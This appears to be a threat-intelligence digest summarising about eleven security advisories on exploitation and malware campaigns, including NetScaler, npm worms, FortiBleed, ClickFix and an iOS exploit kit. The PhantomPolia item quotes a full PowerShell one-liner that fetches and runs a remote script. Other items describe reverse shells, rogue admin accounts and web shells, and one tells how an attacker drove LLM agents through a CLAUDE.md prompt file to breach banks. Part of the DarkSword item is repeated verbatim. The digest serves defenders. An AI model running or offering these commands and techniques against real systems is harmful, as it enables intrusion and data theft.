item.title: Citrix NetScaler CVE-2026-88771: Observed Exploitation Artifacts and Hunt Indicators
item.description:
CVE-2026-88771, a critical pre-auth command injection in Citrix NetScaler ADC and Gateway, is being actively exploited in the wild, with LevelBlue's THOR team documenting the full kill chain across multiple customer environments.
Key findings:
- Exploitation leaves a distinct fingerprint in NetScaler authentication logs. Attacker-controlled usernames contain the strings pitboss, NSPPE, and "unexpectedly died" alongside injected shell commands. Defenders can hunt these strings combined with curl, wget, whoami, perl, python, tar, or cat. The use of ${IFS} as a whitespace substitute is an additional high-value search term because it avoids literal spaces in injected commands. Exploitation sources include 70.172.58[.]168, 162.243.36[.]88, 173.40.135[.]209, 47.230.224[.]154, 92.118.204[.]229, and 87.224.84[.]82.
- Two second-stage payloads were recovered and analyzed. main[.]py (SHA-256: e9fe43968c6c0955300e3bc4d7fb0b05a18570b4733aaf4f5c6f7f09be5a242c), hosted at hxxp://23.27.143[.]20:9000/main.py, overwrites /var/python/bin/customsnmpd with Python code that opens a TCP reverse shell to 45.141.21[.]130:443 and launches /bin/sh. update_c08937.pl (SHA-256: 974b69782fdf5d67b97cfd508465939e44ee10798dbcc1e82b92d78776bad938), hosted at hxxp://64.94.85[.]67:443/update_c08937.pl, is piped directly into Perl from memory, leaving no fixed on-disk copy. Both payloads represent deliberate infrastructure: 64.94.85[.]67 served as exploit source, payload host, and exfiltration endpoint simultaneously.
- Post-exploitation is comprehensive and targeted at persistent access plus data theft. update_c08937.pl creates a local superuser account named sec_monitor, archives /flash/nsconfig to /tmp/update_result_3567cs.tgz, uploads it to 64.94.85[.]67:443, then deletes the archive and the script. It also sets /bin/sh permissions to 6555, deploys a PHP web shell at /var/netscaler/logon/LogonPoint/.local_journal, and modifies /etc/httpd.conf to expose that shell through CSS-like URLs (LogonUISimple.html[.]style.min.css and randomized hex variants). Configuration data was also staged to /var/netscaler/logon/insight-new.js and /var/netscaler/logon/LogonPoint/xua.html.
- Absence of files does not equal clean. The Perl payload deletes both the configuration archive and itself after execution. Investigators should not interpret missing artifacts as evidence of failed execution. If the sec_monitor account exists in /flash/nsconfig/ns.conf, /bin/sh carries 6555 permissions, or .local_journal is present in the LogonPoint directory, the payload ran successfully regardless of what is no longer on disk.
Practitioner takeaway: Patch affected appliances immediately, then work backward through authentication logs before the patch date hunting for pitboss, NSPPE, and ${IFS}. For every identified attempt, do not stop at the auth event: pivot to network telemetry for outbound connections to 45.141.21[.]130 and 64.94.85[.]67, check /var/python/bin/customsnmpd for unexpected modification timestamps, audit local accounts for sec_monitor, verify /bin/sh permissions, and inspect /etc/httpd.conf for new Alias or SetHandler directives. A failed authentication event does not mean the injection failed. Full IOC list including all IPs, URLs, hashes, and file paths is in the report.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2108014958990553481

item.title: Evolution of Web3 in Cloud Supply Chain Attacks
item.description:
North Korean 🇰🇵 state actors and criminal groups are weaponizing Web3 blockchain infrastructure as C2 for supply chain worms targeting developer workstations and CI/CD pipelines, bypassing traditional domain takedown and IP blocklisting entirely.
Key findings:
- The ChainDrop npm worm, traced to the Shai-Hulud family, infected over 400 npm packages including keyv and cacheable-request. A preinstall script hook downloads a custom Bun runtime to launch an obfuscated credential harvester that searches both disk and memory inside running build processes, capturing ephemeral IAM keys, CI/CD worker tokens, and short-lived OIDC federation keys. It then injects persistent task hooks that fire whenever a developer opens a project or starts an AI coding session, using EtherHiding to query smart contract state variables for dynamically encrypted exfiltration endpoints.
- The PolinRider campaign, attributed to North Korean 🇰🇵 state-sponsored actors including Alluring Pisces (aka Sapphire Sleet or Midnight Neptune), spans npm, Go modules, and Packagist. Malicious loaders are concealed inside repository configuration files and IDE workspace automation rather than standard install scripts. C2 resolution uses a hybrid architecture crossing TRON, Aptos, and Binance Smart Chain via TxDataHiding, embedding encrypted payloads in raw transaction calldata fields (0x...) sent to dynamic router contracts or burn addresses. If one chain is blocked, the actor broadcasts a fresh transaction on another network, updating global C2 endpoints instantly.
- The most evasive technique identified is NullReceiver, spotted in compromises targeting front-end dependencies bianira-ui and fluid-type-ui. It eliminates smart contracts, input data, and executable payloads entirely. The loader queries an actor-controlled wallet for its latest zero-value transaction and mathematically extracts a C2 IPv4 address from the 20-byte recipient address structure itself. No code structure or domain string exists for security filters to inspect. Zero value, zero data, zero detectable payload.
- Three confirmed DPRK supply chain operations link to shared C2 beacon behaviors, SSL configurations, and clustered VPS hosting ranges: the Axios compromise (backdoored dependency plain-crypto-js exfiltrating cloud tokens and macOS code-signing certificates), the Mastra AI campaign (poisoned npm packages scraping developer environment variables via build hooks), and the Rust arrayref crate on crates[.]io (compilation hook triggering a second-stage payload on project build). All three demonstrate a deliberate strategy of converting single maintainer account compromises into long-lived cloud administrative access across enterprise environments.
- Extracted credentials from developer workstations and CI/CD runners can provide direct access to cloud management consoles and APIs, bypassing MFA when additional controls are absent. The report emphasizes that once stolen OIDC federation tokens and short-lived IAM keys are in attacker hands, traditional perimeter defenses offer no recovery path.
Practitioner takeaway: For most enterprise environments, any outbound connection to public blockchain RPC gateways (Ethereum JSON-RPC eth_call or eth_getTransactionByHash, TRON, Aptos, BSC nodes) from a developer workstation, build runner, or compiler binary is an immediate high-confidence anomaly. Hunt for unexpected child processes spawned from package managers (npm, cargo, go), scripting engines executing from within CI/CD runner directories, and modifications to repository configuration files, package manifests, or IDE workspace automation files outside of approved change windows. Preserve memory from build runners at the moment of detection since ephemeral keys and OIDC tokens exist only in-process. Full IOC list and additional detection guidance are in the Unit 42 report.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2107985233643536790

item.title: Eight Malicious npm Packages Downloaded 40,767 Times Deliver Overlord RAT and Stealer
item.description:
Eight malicious npm packages downloaded 40,767 times deliver Overlord RAT and the movinlike Node.js stealer in a campaign running since August 2023, attributed to a likely Brazilian 🇧🇷 solo operator.
Key findings:
- The campaign, codenamed MALFEX by CloudSEK and Checkmarx, uses three infection pathways: a loader for Overlord RAT (an open-source Go-based RAT that abuses Solana blockchain transactions to resolve its C2 address), a chain installing movinlike, a Node.js stealer targeting Discord, browsers, Telegram, and crypto wallets, and a generic downloader. Three packages (tlxbnhd, tldriver, mxdriver) serve as Overlord loaders triggered via npm lifecycle hooks that download and execute a Windows binary on install.
- The postinstall hook in function-flag is the campaign's workhorse with 37,419 of the 40,767 total downloads. Version 1.7.3 runs example.js, which calls an ASCII art function using the "Bloody" font as a trigger for a hidden routine. That routine downloads node.exe from cdnzona.discloud[.]app, saves it to %APPDATA%\node.exe, and executes it with a hidden window. Each package version has served its payload from a different remote location, complicating static detection. function-color lists function-flag as a dependency, carrying no payload of its own but acting as a delivery wrapper. Three packages (function-flag, function-color, cdn-img-fetch) remain live on npm as of reporting.
- Attribution indicators point to a Portuguese-speaking operator in the UTC-0300 timezone. The npm project description reads "created with a lot of love and dedication by the Malfex team, whose owner is Murizada." Git commit times, repository descriptions in Portuguese 🇵🇹, and a GitHub display name and email with a common Brazilian 🇧🇷 handle all support this assessment. Researchers are explicit that this reflects operator linguistics, not victim targeting: delivery via npm and Discord is global and opportunistic.
- Overlord RAT's use extends beyond this npm campaign. Since July 2026 it has appeared in two separate operations: one exploiting WordPress vulnerabilities CVE-2026-63030 and CVE-2026-60137 (wp2shell), and a macOS campaign using a fake Zoom installer with tactical overlaps attributed to the suspected North Korea-aligned cluster UNK_DeadDrop. The same open-source RAT appearing across unrelated threat clusters, including a nation-state-adjacent one, signals it is becoming commodity tooling.
Takeaway: Hunt your environment for node.exe written to %APPDATA% by any npm install process, and audit postinstall and preinstall hooks in your dependency tree for outbound downloads. The Solana-based C2 resolution used by Overlord means traditional domain blocklists will not catch the C2 channel. Flag any process spawned with a hidden window from %APPDATA%\node.exe. The packages still live on npm (function-flag, function-color, cdn-img-fetch) should be blocked at your registry proxy or private mirror. Full IOC list is in the report.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2107970368891945451

item.title: FBI Warns FortiBleed Remains Active After Amassing 86,644 Fortinet Device Credentials
item.description:
Russian-speaking initial access broker "FortiBleed" has harvested 86,644 Fortinet device credentials across 194 countries and remains active, with operator overlaps tying it to INC and Lynx ransomware deployments.
Key details:
- FortiBleed is a five-stage operation: reconnaissance of internet-exposed FortiGate firewalls and SSL VPN portals, credential stuffing and password spraying using prior leak dumps and infostealer logs, passive interception of authentication traffic across 24 protocols via a Go-based tool called FortigateSniffer, offline hash cracking on a GPU-accelerated cluster using Hashmat and Hashtopolis, and finally lateral movement, AD enumeration, Kerberos validation, SMB authentication, and network share exfiltration. Session cookies are weaponized to sustain persistent, authenticated access.
- The campaign exploits legacy SHA-256 password storage to make offline cracking viable at scale. Cracked credentials are enriched and triaged by scripts that filter honeypots, map organizations, and prioritize targets by revenue and network structure, a clear indicator of a professional broker operation rather than opportunistic scanning.
- Persistence on appliances is achieved by creating new administrative accounts and in some cases deleting original accounts to lock defenders out. The FBI and USSS have published a list of 19 commonly observed rogue account names to watch for, including adminin, fortiAdmin, forticloud-sync, fgtsecure, districtadmin, system_config, adminsslvpn, and forti_support2. Finding any of these in your firewall's user database is a high-confidence indicator of compromise.
- Operator overlaps connect FortiBleed activity to INC and Lynx ransomware groups, confirming the access is being packaged and resold. Victims should treat FortiGate compromise as a ransomware precursor event, not just a credential theft incident. The blast radius extends well beyond the perimeter appliance into Active Directory.
- DFIR responders should collect the full local user account list from the FortiGate admin interface and authentication logs before isolating the device, because account deletion is a documented actor behavior that destroys evidence in place. Check SSL VPN session logs and admin login history for authentication from unexpected source IPs, unusual session durations, or logins outside business hours. On the internal network, hunt for lateral movement artifacts: Kerberos ticket requests from the firewall's management IP, SMB authentication events in Windows Security logs (Event ID 4624 and 4625) originating from firewall-adjacent hosts, and new privileged AD accounts created around the time of initial firewall access.
Takeaway: Audit your FortiGate local user list against the 19 rogue account names in the advisory right now. If you find any, treat the device as fully compromised, do not just delete the account and move on. Preserve logs and config snapshots before isolation, migrate to PBKDF2 password storage, and rotate all credentials that could have transited the device. The FBI and USSS advisory contains the full indicator and countermeasure details.

item.title: From Guest Complaints to Malware: Blockchain Abuse Targets Hotels
item.description:
Blockchain-based C2 evasion hits the hospitality sector: EtherRAT and TONResolver malware families abuse Ethereum and TON smart contracts to resolve live C2 addresses, making conventional takedown requests largely ineffective.
Key findings:
- The attack chain begins with AI-generated fake guest complaint or negative review emails sent directly to hotel front desk, reservations, or guest relations staff. Links in the emails lead to an archive containing a malicious LNK shortcut masquerading as a JPG image file, alongside a dummy MP4 file whose size varies on every download to defeat static hash detection. Once the LNK executes, it fetches a NodeJS runtime and installs either EtherRAT or TONResolver.
- EtherRAT resolves its C2 by sending an eth_call read request to a public Ethereum JSON-RPC endpoint, pulling the current C2 address from a smart contract storage slot. The tracked contract 0x277852e1C349b03c79E348018a8391bD21C412E8 has rotated through more than a dozen C2s over time, including hxxps://gateway001kir[.]com, hxxps://sslgateway001[.]com, hxxps://update.norwayeast.cloudapp[.]azure[.]com, and hxxps://synctimes.australiaeast.cloudapp[.]azure[.]com, among others.
- TONResolver mirrors the same design against the TON blockchain. The tracked contract address 0:c66119f0e5635c4380441d7a79baf0c02a0ab7ea6cd78de06507fc5dc2c1a5d9 has resolved to domains including amanohuguta[.]cfd, hsaertyuoang34[.]sbs, zloapobikahy23[.]bond, tonajukbhuakpo2[.]shop, njzlopghznkamkl[.]cfd, and nuypoiaklber[.]lol. Both malware families run under NodeJS, suggesting shared loader infrastructure.
- The blockchain dead drop technique, tracked by MITRE ATT&CK as T1102.001, is more resilient than pastebin, social media, or dynamic DNS dead drops because blockchain data cannot be deleted by any registrar, hosting provider, or single law enforcement request. The threat actor rotates C2 simply by submitting a small on-chain transaction. Cofense Intelligence assesses with moderate confidence this campaign is a continuation of earlier Booking.com-spoofing ClickFix campaigns that delivered PureRAT and NetSupport Manager RAT, based on overlapping lure themes and target sector timing.

item.title: Unknown Threat Actor Uses AI-Driven ARTEX to Target South Korean Finance
item.description:
An unattributed, likely Chinese-speaking threat actor used the open-source agentic AI pentesting tool ARTEX to breach South Korean 🇰🇷 financial organizations in late September to early October 2026, exfiltrating data across multiple banks in a compressed operational window.
Key findings:
- ARTEX, a recently released open-source agentic pentesting framework developed in China 🇨🇳, served as the core offensive capability. The ARTEX instance ran on 38.244.50[.]120 at port 18899, with a Claude Code markdown file at hxxp[:]//38.244.50[.]120:18899/.claude/CLAUDE.md containing Chinese-language prompts instructing the LLM how to conduct pentesting. DeepSeek v4.1-flash was the primary LLM backend, supplemented by GLM-5.3 (Zhipu AI) and Grok 4.6, with API access routed through the proxy/reseller xcai[.]pro. This two-server architecture separated attacker-controlled Hong Kong-based primary infrastructure from the ARTEX attack node.
- The threat actor's open directories were the critical forensic windfall here. Exposed Claude Code session histories, ARTEX configuration files, and Claude memory files gave CrowdStrike direct visibility into operational methodology, targeting scope, and tool configuration. The session histories confirmed targeting of South Korean 🇰🇷 financial organizations including a loan inquiry service used by brokers and an employee mobile work-support system. The threat actor also used Claude to identify Korean Telegram data sales groups for offloading stolen data.
- Operational security failures embedded possible threat actor identity into the Claude Code sessions. A prompt asked Claude to build a security researcher resume using the name YY, phone 17820191556, Telegram [@]YY520CN, age 26, South China 🇨🇳 University of Technology, and a location of Maoming, Guangdong, China 🇨🇳. The same Telegram handle appeared in separate sessions targeting a Telegram-based NFT gift marketplace and a possible Chinese 🇨🇳 payment platform. CrowdStrike notes these details likely belong to the actor but cannot be definitively confirmed.
- Nine proxy IPs were identified from Claude Code session analysis: 101.53.80[.]20, 205.214.59[.]31, 124.155.252[.]63, 154.201.79[.]246, 23.248.249[.]90, 23.158.220[.]98, 103.248.148[.]84, 203.160.133[.]172, and 209.209.85[.]38. MITRE ATT&CK techniques documented include T1583.003 (Acquire Infrastructure: VPS), T1588.007 (Obtain Capabilities: Artificial Intelligence), and T1090 (Proxy).
Practitioner takeaway: The investigative lesson here is that agentic AI tools generate rich operational artifacts, and when threat actors expose those artifacts via open directories, session histories become a full reconstruction of intent, targeting, and tooling. For defenders at financial institutions, hunt for inbound connections from the listed proxy IPs and block 38.244.50[.]120. For threat hunters broadly, start monitoring for ARTEX-related strings in web logs and HTTP responses on threat actor-controlled infrastructure. Full IOC table is in the CrowdStrike report.

item.title: CERT-UA: Fake Cloudflare Checks Deliver LunexStealer Malware
item.description:
Ukrainian 🇺🇦 CERT-UA exposes a blockchain-controlled ClickFix campaign across 100+ compromised sites delivering LunexStealer, a credential stealer with live browser hijacking and file system access via a malicious extension chain.
Key findings:
- Attackers injected malicious JavaScript into over 100 hacked websites to serve a fake Cloudflare bot-verification page using the ClickFix technique. The lure prompts visitors to open Run, Command Prompt, or PowerShell and paste a command that silently fetches and executes an MSI package from an attacker-controlled server. The attack only fires against Windows users arriving through search engines, and caps exposure at twice per visitor per 12-hour window, deliberately suppressing anomalous traffic signatures.
- The command-and-control infrastructure uses a smart contract on Polygon or Ethereum blockchain to store the active domain and script configuration. The script polls the contract on each execution, letting operators rotate domains or toggle attack modes (off, passive tracking, or full ClickFix lure) without touching the compromised host sites. This architecture makes traditional domain-based takedown largely ineffective.
- CERT-UA identified three distinct MSI variants delivering the same final payload. Variant one installs LunexStealer directly. Variant two attempts UAC bypass, carves Microsoft Defender exclusions, and deploys a vulnerable AMD driver to exploit CVE-2023-20598, a bring-your-own-vulnerable-driver (BYOVD) technique that disables security tooling before the stealer drops. Variant three bypasses the driver path entirely, using DLL side-loading to have a legitimate executable load a malicious library that decrypts and launches the stealer.
- LunexStealer goes well beyond credential theft. It accepts commands from its control server to download and execute binaries, MSI packages, PowerShell scripts, and raw shell commands. It can also install a malicious browser extension named LUNARAXE, which presents in the browser as "Microsoft Office Word Editor." LUNARAXE harvests cookies, browsing history, and form input, and gives the attacker remote control over the browser: executing JavaScript on pages, managing tabs, taking tab snapshots, and changing proxy settings.
- A PowerShell component called NAIVEMESS extends the attack surface further. CERT-UA says it registers as a native messaging host, which is a legitimate browser-to-OS communication mechanism, allowing the LUNARAXE extension to read, write, and launch files on the victim's machine. Forensically, look for unexpected native messaging host registry entries under HKCU\Software\Google\Chrome\NativeMessagingHosts or equivalent Firefox paths, browser extensions with names mimicking Microsoft products, unusual MSI installation events, AMD driver loads on non-AMD hardware, and DLL side-loading from writable directories adjacent to signed executables.
DFIR takeaway: Hunt for PowerShell or msiexec.exe spawned from user-interactive contexts (clipboard paste patterns via Run dialog), unexpected native messaging host registrations, and browser extensions named "Microsoft Office Word Editor" in extension directories. For the BYOVD path, check for the vulnerable AMD driver load on systems without AMD hardware and any Defender exclusion registry writes preceding payload execution. The full IOC list and malware breakdown are in the CERT-UA advisory.

item.title: 86,644 Firewalls in 194 Countries Breached With Stolen Passwords
item.description:
FBI and USSS warn of FortiBleed, an active initial access broker campaign that has compromised 86,644 Fortinet FortiGate firewalls across 194 countries using stolen credentials, with confirmed links to INC/Lynx and Payload ransomware affiliates.
Key details:
- The attack chain is an industrialized IAB operation. Actors scan internet-facing FortiGate SSL VPN portals, stuff credentials from prior Fortinet leak dumps and infostealer logs, exfiltrate password hashes, then crack them offline using Hashcat and Hashtopolis on rented GPU infrastructure. Scripts filter honeypots, score targets by revenue and network structure, and create new admin accounts for persistence before selling working VPN configs and target lists to ransomware affiliates, currently INC/Lynx and Payload ransomware. The actors' own backend server was left exposed, revealing the full operational pipeline.
- Persistence and lockout are deliberate. Threat actors create rogue administrative accounts (look for adminin, fortiAdmin, forticloud-sync, fgtsecure, adminsslvpn, itadmin, roadmin) and in some cases delete or change legitimate admin credentials to lock out the owning organization. Recovery goes beyond a password reset; victims may need out-of-band access to reclaim their own devices.
- The advisory releases specific IOCs. C2 server: 45.154.12[.]132. Proxy nodes: 154.202.59[.]169 and 103.27.186[.]156. Beacon relay: 45.155.250[.]158. Hashtopolis cracking infrastructure: 85.11.187[.]8. Thirteen additional IPs observed conducting brute-force or compromised-account authentication between June 18 and July 23, 2026 are listed in the advisory. FBI and USSS note that IPs may be reassigned, so vet before acting.
- Legacy SHA-256 password storage is the cracking enabler. FortiOS prior to v7.2.11 uses SHA-256 to store admin credentials, which GPU clusters crack efficiently at scale. The advisory directs organizations to migrate to PBKDF2 following Fortinet guidance for FortiOS v7.2.11 and later, and to audit and rotate all REST API keys, removing any unrecognized ones.
- Detection surface spans multiple log sources. Hunt FortiGate and VPN authentication logs for the rogue account names above, admin account creation events, session authentications from the listed IPs, and any changes to local-in policies or trusted-host configurations. Pivot to domain controller logs for post-access Active Directory enumeration. If ransomware affiliates received access, lateral movement artifacts will precede any encryption event.
Practitioner takeaway: terminate all active admin and VPN sessions now, audit local accounts against the known rogue usernames, and review REST API keys before rotating passwords, because an actor who already has a valid key survives a credential reset. Full IOC list including the 13 brute-force source IPs is in the FBI/USSS advisory. Report confirmed compromises to IC3 or a local FBI or USSS field office.

item.title: DarkSword/Coruna Open Directory Finding Report
item.description:
Five open directories exposed the full DarkSword/Coruna iOS exploit-and-harvest platform live, including a production server with 11 stolen BIP39 seed phrases, 179 victim loot directories, and a 75-account reseller roster.
Key findings:
- The five hosts (43.134.165[.]205:9999, 166.88.95[.]90:9999, 23.148.212[.]237:8888, 47.102.192[.]23:9876, 156.239.230[.]120:8080) were live at triage time. Two real Chinese 🇨🇳 iOS devices (183.154.173[.]30 on CHINANET Hangzhou and 182.239.114[.]223 on China 🇨🇳 Mobile Hong Kong) beaconed every three seconds for hours on 2026-09-06, generating 4,690 fingerprint-report lines in reports.jsonl. The implant runs inside the victim's open browser tab on a watering hole page and polls its C2 on a 3-second loop, so that flat-cadence beacon pattern in web logs is a primary detection signal.
- The Coruna payload module hash 1334417664270db20af705f422878c53c8378203 is byte-identical across all four captures, confirming a single kit. After DarkSword's WebKit/JavaScriptCore exploit chain achieves kernel read/write and injects into SpringBoard, it loads a three-stage dylib chain: bootstrap.dylib (SHA-256 c391bce7b09a0ea263e4b2c1d1bde0327c180723fa3299b006485429564c61ee), stage2.dylib (8973e80ab494c02463d4123f76fc5e2dca2ea2c097317d246323d75c1f2eb791), and core_v6.dylib (a50c4da5c92636b2b1f170cdce3bd967a213886a8df5656cf3519214fcecfac5). The SpringBoard coordinator persists as future-destroy.htm (7ff5bb16cd5f8c92bc4fec72bba162662f202af075418db5000a1b4f81489fc2), a Mach-O binary disguised with a .htm extension. Device-side persistence lives at /Library/LaunchDaemons/com.apple.ds.agent.plist with IPC sockets at /tmp/nb_cmd and /tmp/nb_result and session cookies ds_uuid, ds_done, and coruna-lab-session.
- Eighteen wallet-injection dylibs target Bitpie, Coinbase, Exodus, imToken, MetaMask, Phantom, Trust Wallet, Uniswap, OKEx, and nine others, stealing BIP39 mnemonics from app processes, Photos, and Notes (only checksum-valid phrases are exfiltrated). All 18 share a hardcoded AES key (Ek8pl31K2yeHgQwy) and five split exfiltration endpoints. A separate Chinese 🇨🇳 operator running 22 wild builds against hxxps://66ds[.]lol (origin 101.35.158[.]183, AS45090 Tencent, Shanghai) adds BitKeep as a 19th wallet target (libbitDylib.dylib). That operator is tied through a unique self-signed CA (Codex iOS Isolated Lab Root CA 2026, O=IPLCZ Test Lab) to northlab[.]cn on Shenyang China 🇨🇳 Unicom/Telecom IPs 218.25.85[.]177, 218.25.85[.]178, 59.46.4[.]117, and 59.46.4[.]119.
- The production server at hdios[.]cn (112.213.108[.]85) lists six tracked CVEs plus two newly documented ones: CVE-2025-24201 (WebKit sandbox escape for iOS below 18.3.2) and CVE-2025-31200 (a CoreAudio zero-click, capability claim only, unverified on device). A seventh CVE, CVE-2026-31001 (JavaScriptCore type confusion in garbage collection/JIT), is in development on 23.148.212[.]237 targeting iOS 26, but kernel and sandbox-escape stages are one-byte placeholders and have not been deployed. The gooll/ chain targets iOS 13.0 through 17.2.1 with a self-adaptive kernel stage that fingerprints the device at runtime rather than using offset tables, fans across five memory-access backends for layered fallback, and defeats PPL via two separate bypass paths. The 18.x chains are patched in iOS 18.7.3 and 26.3.
- The Censys report ships a 44-rule YARA signature set covering the full binary surface (27 wallet-module rules, 3 implant-layer rules, 17 exploit-chain rules including five GHOST signatures) with zero false positives across several thousand legitimate macOS binaries and 347-of-347 coverage across the sample set. The full IOC list, payload hash table, and YARA rules are in the report.
Practitioners: hunt iOS endpoints for /Library/LaunchDaemons/com.apple.ds.agent.plist, /tmp/nb_cmd, /tmp/nb_result, and the cookies ds_uuid and coruna-lab-session. In web and proxy logs, flat 3-second beacon cadence from a single session ID to any of the listed C2 IPs is the clearest live-compromise signal. Track staging host signatures and panel body hashes rather than domains, which churn faster. The 23.148.212[.]237 iOS 26 development work is the forward lead to monitor.

That operator is tied through a unique self-signed CA (Codex iOS Isolated Lab Root CA 2026, O=IPLCZ Test Lab) to northlab[.]cn on Shenyang China 🇨🇳 Unicom/Telecom IPs 218.25.85[.]177, 218.25.85[.]178, 59.46.4[.]117, and 59.46.4[.]119.

- The production server at hdios[.]cn (112.213.108[.]85) lists six tracked CVEs plus two newly documented ones: CVE-2025-24201 (WebKit sandbox escape for iOS below 18.3.2) and CVE-2025-31200 (a CoreAudio zero-click, capability claim only, unverified on device). A seventh CVE, CVE-2026-31001 (JavaScriptCore type confusion in garbage collection/JIT), is in development on 23.148.212[.]237 targeting iOS 26, but kernel and sandbox-escape stages are one-byte placeholders and have not been deployed. The gooll/ chain targets iOS 13.0 through 17.2.1 with a self-adaptive kernel stage that fingerprints the device at runtime rather than using offset tables, fans across five memory-access backends for layered fallback, and defeats PPL via two separate bypass paths. The 18.x chains are patched in iOS 18.7.3 and 26.3.

- The Censys report ships a 44-rule YARA signature set covering the full binary surface (27 wallet-module rules, 3 implant-layer rules, 17 exploit-chain rules including five GHOST signatures) with zero false positives across several thousand legitimate macOS binaries and 347-of-347 coverage across the sample set. The full IOC list, payload hash table, and YARA rules are in the report.

Practitioners: hunt iOS endpoints for /Library/LaunchDaemons/com.apple.ds.agent.plist, /tmp/nb_cmd, /tmp/nb_result, and the cookies ds_uuid and coruna-lab-session. In web and proxy logs, flat 3-second beacon cadence from a single session ID to any of the listed C2 IPs is the clearest live-compromise signal. Track staging host signatures and panel body hashes rather than domains, which churn faster. The 23.148.212[.]237 iOS 26 development work is the forward lead to monitor.

item.title: Inside PhantomPolia: Remus Stealer Delivery via Donut Shellcode in ClickFix Campaign
item.description:
PhantomPolia loader uses Ethereum Sepolia blockchain as a dead-drop resolver to deliver Remus Stealer through a five-stage ClickFix chain observed since September 2026, with no attacker domain directly visible on compromised pages.
Key findings:
- The PhantomPolia JavaScript loader (T1102.001, T1059.007) embeds no C2 domain on the compromised site. Instead it issues an eth_call JSON-RPC request to a hardcoded Sepolia contract address, retrieves an AES-GCM encrypted blob, derives a 256-bit key via PBKDF2 (100k iterations, SHA-256) using a sample-specific hardcoded password, and decrypts the blob locally to recover the next-stage domain. Seven distinct contract addresses and PBKDF2 passwords are documented, each resolving a unique C2: voderlence[.]com, nightflamevortex[.]top, voidravenstorm[.]top, velnoderic[.]com, ironphantomcore[.]top, stormvenomforge[.]top, and shadowemberstrike[.]top. This architecture lets the attacker rotate infrastructure by updating the blockchain record alone.
- The ClickFix lure (T1204.004) tricks victims into running a consistent PowerShell one-liner: powershell.exe -w h -ep bypass -c "iex((iwr '{domain}/check/update.ps1' -UseBasicParsing -UserAgent 'Mozilla/5.0...Edg/144.0.0.0').Content)". The update.ps1 script, served from cloudcheckic[.]com among others, retrieves a separate AES-CBC-encrypted payload using dynamic $id, nonce, and ts request parameters with a WindowsPowerShell User-Agent, then drops a bundled AutoIt installer to %TEMP% under names such as data_work.exe, audio-music.exe, and current-cache.exe.
- The AutoIt stage (T1059.010) drops AutoIt3.exe alongside a script named Setup_e30ea5.au3, AutoStart_33875e.au3, or Config_9571a0.au3. The .au3 script decodes a large Base64 blob via CryptStringToBinaryA, decrypts it with Windows CryptoAPI (CryptAcquireContextW, CryptImportKey, CryptDecrypt), then calls VirtualAlloc with MEM_COMMIT|MEM_RESERVE and PAGE_EXECUTE_READWRITE (0x3000, 0x40), copies the shellcode in via DllStructSetData, and executes it via CreateThread, all within the AutoIt process (T1055.002, T1620). The shellcode is Donut-packed (DONUT_INSTANCE_EMBED, DONUT_MODULE_DLL) and unpacks Remus Stealer in memory.
- Remus Stealer, first advertised on a Russian-language underground forum on February 12, 2026, and described as a potential Lumma successor, performs a three-step beacon: a registration POST with tag (embedded campaign MD5), exp (Unix timestamp), and hwid to github[.]com /comments using WinHTTP with hashed API resolution; a token assignment response returning a UUID access_token; and a multipart data upload to C2 domains including spogear[.]click:3546, oceanvw[.]click, cruahop[.]shop, and drepace[.]click. Collected data is compressed with a custom LZ77 implementation and encrypted with ChaCha20, but critically the 32-byte key and 8-byte nonce are appended to the ciphertext in the captured blob, meaning traffic captures can be decrypted without recovering keys from the binary. Targeting covers browsers (Chromium and Mozilla families), 2FA apps, over 50 password managers including 1Password, Bitwarden, KeePass, and LastPass, 20+ cryptocurrency wallets, and VPN clients.
DFIR takeaway: On a suspected host, pivot immediately to %TEMP% for AutoIt3.exe alongside a randomized subdirectory containing a .au3 file matching the naming pattern (Setup|AutoStart|Config)_[A-Za-z0-9]{6}.au3. Memory acquisition is essential: Remus runs entirely in-process after Donut unpacking, leaving no final payload on disk. In network captures, look for POST requests to github[.]com /comments with a body containing tag=, exp=, and hwid= fields. If you have full packet capture, the ChaCha20 key and nonce trail the ciphertext in the exfiltration blob and can be extracted directly to decrypt stolen data. For proactive hunting, check RunMRU (HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU) for PowerShell ClickFix entries and monitor outbound eth_call POST requests to 0xrpc[.]io/sep or 1rpc[.]io/sepolia. Full IOC list, Suricata rules covering all five stages, and EDR hunt queries are in the LevelBlue SpiderLabs report.

item.title: FortiBleed Is Still Active, Locking Organizations Out
item.description:
FortiBleed is still active: FBI and Secret Service joint advisory confirms 86,644 compromised Fortinet FortiGate devices across 194 countries, with defenders being actively locked out of their own firewalls while attackers retain control.
Key findings:
- The lockout scenario is the critical operational shift. Beyond creating rogue admin accounts for persistence (T1136.001), actors are deleting or changing legitimate account passwords (T1531, Account Access Removal). Standard runbooks that assume a credential reset restores a clean state will fail. If you cannot reach your FortiGate out-of-band, you may be shut out while the actor pivots internally. Confirm you have out-of-band administrative recovery paths before you need them.
- The attack chain is commodity tradecraft at industrial scale, not novel malware. Actors scan for exposed SSL VPN portals (T1595, T1190), harvest credentials via stuffing and spraying (T1110.004, T1110.003) seeded from prior Fortinet leak dumps and infostealer logs, then crack exfiltrated hashes offline (T1110.002) using Hashcat and Hashtopolis against a GPU cluster. The weakness is legacy SHA-256 password storage in FortiOS. Scripts then filter honeypots, rank targets by revenue and network structure, plant new admin accounts, run AD enumeration (T1087), and package verified VPN configs for sale. This is an IAB supply chain and the ransomware customer list is growing: INC/Lynx and Payload ransomware are named, but access sold today can surface as an encryption event under a new brand weeks from now.
- Account names are the highest-signal artifact to hunt immediately. Any active account matching these names is a strong intrusion indicator: adminin, admin, forticloud-tech, gttadmin, Technical_support, my_admin, forti_support2, fortiAdmin, fgtsecure, districtadmin, roadmin, adminsslvpn, support_fortinet, forticloud-sync, pakedge, system_config, itadmin, IT_Manager, fgtsec. Do not overlook two quieter persistence vectors the advisory calls out: SSH access (if the SSH port was open, actors may have used it directly) and REST API keys, which survive a password reset entirely. Enumerate all API keys, remove anything unknown, and rotate legitimate ones.
- Defanged C2 and supporting infrastructure to corroborate against current telemetry: 45.154.12[.]132 (C2), 154.202.59[.]169 and 103.27.186[.]156 (proxy nodes), 45.155.250[.]158 (beacon relay), 85.11.187[.]8 (Hashtopolis node), 193.8.187[.]2 and 193.8.187[.]42 (facilitating infrastructure). Beaconing observed over HTTPS on ports 4332 and 4432. A set of brute force and successful auth source IPs from June-July 2026 is documented in the advisory. Cloud addresses get reassigned, so corroborate against your own auth logs before blocking.
